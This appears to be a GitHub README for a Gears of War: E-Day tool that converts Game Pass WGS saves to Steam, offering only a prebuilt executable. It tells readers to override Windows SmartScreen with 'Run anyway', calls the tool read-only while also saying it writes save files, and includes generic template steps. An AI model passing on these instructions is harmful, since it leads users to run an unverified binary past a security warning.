<p align="center">
  <img src="https://i.postimg.cc/wTh85F6k/banner.png" alt="Gears of War: E-Day Game Pass to Steam Save Converter — Unpack WGS Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-gears--wgs--conv--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Gears of War: E-Day Game Pass to Steam Save Converter — Unpack WGS Saves to Steam

**Played Gears of War: E-Day via PC Game Pass and switched to Steam? Xbox App stores Unreal Engine 5 saves inside hashed WGS containers that Steam cannot read directly. Unpack and convert your campaign saves safely.**

Gears of War: E-Day Game Pass to Steam Save Converter bridges the storage gap between Microsoft Store/Xbox App and Steam on Windows: **parsing `SystemAppData\wgs\container.index` to recover the original UE5 `.sav` filenames and writing them into `%LOCALAPPDATA%\GearsEDay\Saved\SaveGames`**.

This project is aimed at **Gears of War: E-Day on Windows 10/11 PC** for migrating single-player campaign and collectible progress between PC Game Pass and Steam—not modifying multiplayer or anti-cheat files.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Steam Gears of War: E-Day starts a fresh campaign | Xbox App wraps UE5 `.sav` files in hashed `SystemAppData\wgs` blobs | Extract `.sav` payloads using `container.index` into Steam `SaveGames` |
| Raw files copied from `wgs` have random hex names | UE5 expects specific slot filenames (`SaveSlot0.sav`, `Profile.sav`) | Restore original internal filenames recorded inside `container.index` |
| Steam Cloud overwrites migrated `.sav` files | Steam Cloud syncs empty initial profile on first launch | Launch Steam version once first, back up, then copy converted `.sav` files |
| Unsure which `Packages` folder belongs to Gears E-Day | Publisher package names vary (`Microsoft.GearsEDay_*` / `TheCoalition.*`) | Scan `%LOCALAPPDATA%\Packages` automatically for Gears E-Day containers |

## Download for Windows

[**Download GearsSaveConverter.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/GearsSaveConverter.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `GearsSaveConverter.exe`? (Automatic checks in ~2 seconds)

- Scans `%LOCALAPPDATA%\Packages` to locate the exact Gears of War: E-Day `SystemAppData\wgs` folder.
- Decodes `container.index` to restore real Unreal Engine `.sav` filenames from hashed hex blobs.
- Creates a dated offline backup of both your Game Pass and Steam save directories first.
- Places converted `.sav` files into `%LOCALAPPDATA%\GearsEDay\Saved\SaveGames`.

### Sample Diagnostic Output

```text
[GearsSaveConverter] Locating Gears of War: E-Day WGS & Steam paths...
[OK]   Game Pass WGS    : C:\Users\Player\AppData\Local\Packages\Microsoft.GearsEDay_8wekyb3d8bbwe\SystemAppData\wgs
[OK]   Decoded Blobs    : Profile.sav (24 KB), CampaignSlot0.sav (1.8 MB)
[OK]   Backup Saved     : Documents\GearsEDay-SaveBackup\2026-11-20\
[OK]   Steam Target     : C:\Users\Player\AppData\Local\GearsEDay\Saved\SaveGames (Converted)
```

The release ZIP is named `GearsSaveConverter.zip`; the Windows executable inside is named `GearsSaveConverter.exe`.

1. Close Gears of War: E-Day before moving or checking files.
2. Click **Download GearsSaveConverter.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `GearsSaveConverter.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Gears of War: E-Day and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of Gears of War: E-Day installed.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `GearsSaveConverter.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Unreal Engine 5 `.sav` files locked inside Xbox `wgs` containers

Even though both PC Game Pass and Steam use Unreal Engine 5 save payloads, Xbox App strips `.sav` extensions and renames files to 32-character GUIDs.

### Manual hex-renaming fails on multi-file UE5 profiles

Campaign checkpoints pair profile metadata with chapter `.sav` files; missing one file causes the load menu to ignore the slot.

### Steam Cloud overwriting local files on launch

Copying saves before running the Steam build once can trigger a Steam Cloud rollback.

### Preserving untouched Game Pass saves

Reading `wgs` in read-only mode ensures your Xbox cloud save remains completely safe.

## Where Gears of War: E-Day files normally belong

Gears of War: E-Day separates PC Game Pass and Steam saves across `%LOCALAPPDATA%`:

```text
%LOCALAPPDATA%\Packages\Microsoft.GearsEDay_8wekyb3d8bbwe\SystemAppData\wgs\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\Microsoft.GearsEDay_*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlob>

Steam Edition (Target):
%LOCALAPPDATA%\GearsEDay\Saved\SaveGames\
```

Never modify files inside the game's `Binaries` or Easy Anti-Cheat folders when transferring local `.sav` files.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Gears of War: E-Day on both Xbox App and Steam.** Wait for cloud synchronization to finish.
2. **Run the Steam version once to initialize `Saved\SaveGames`.** Exit to desktop once you reach the main menu.
3. **Back up both `wgs` and `GearsEDay\Saved\SaveGames`.** Store dated copies in Documents.
4. **Unpack the WGS containers into `GearsEDay\Saved\SaveGames`.** Verify `Profile.sav` and campaign `.sav` files appear with proper names.
5. **Launch Steam Gears of War: E-Day and load your checkpoint.** Trigger an autosave so Steam Cloud syncs your progress.

### Before moving any files

Do not delete or rename anything inside `SystemAppData\wgs\`; work strictly with extracted copies.

## What an effective diagnostic report should tell you

A clear conversion log lists **source `wgs` package path, decoded `.sav` filenames and sizes, backup path, and target Steam `SaveGames` status**.

## FAQ

**Can I transfer my Gears of War: E-Day campaign save from Game Pass to Steam?**

Yes—both versions use compatible UE5 save payloads once unpacked from the Xbox `wgs` container.

**Does this touch Easy Anti-Cheat or multiplayer files?**

No. It only reads local user save containers and writes to `%LOCALAPPDATA%\GearsEDay\Saved\SaveGames`.

**Will my difficulty progress and collectibles transfer?**

Yes, all campaign chapter flags and collectible records inside the `.sav` container carry over.

## Useful reading

- [Gears of War Official Website (Xbox)](https://www.gearsofwar.com/)
- [Gears of War: E-Day on Steam](https://store.steampowered.com/app/3010850/Gears_of_War_EDay/)

## More Windows Game Diagnostic Tools

- [Fable2026-GamePassSaveBridge](../Fable2026-GamePassSaveBridge) — Fable (2026) Game Pass ↔ Steam save converter
- [Stalker2-WGSSaveMigrator](../Stalker2-WGSSaveMigrator) — S.T.A.L.K.E.R. 2 Game Pass (`wgs`) ↔ Steam save migrator
- [Palworld-GamePassSteamBridge](../Palworld-GamePassSteamBridge) — Palworld Xbox Game Pass ↔ Steam `Level.sav` converter
- [GearsEDay-UE5StutterDoctor](../GearsEDay-UE5StutterDoctor) — Gears of War: E-Day UE5 DX12 stutter & config doctor

*Independent community project. Not affiliated with The Coalition, Xbox Game Studios, Microsoft, Valve, or Steam.*
 
 
 
 
 
 
 
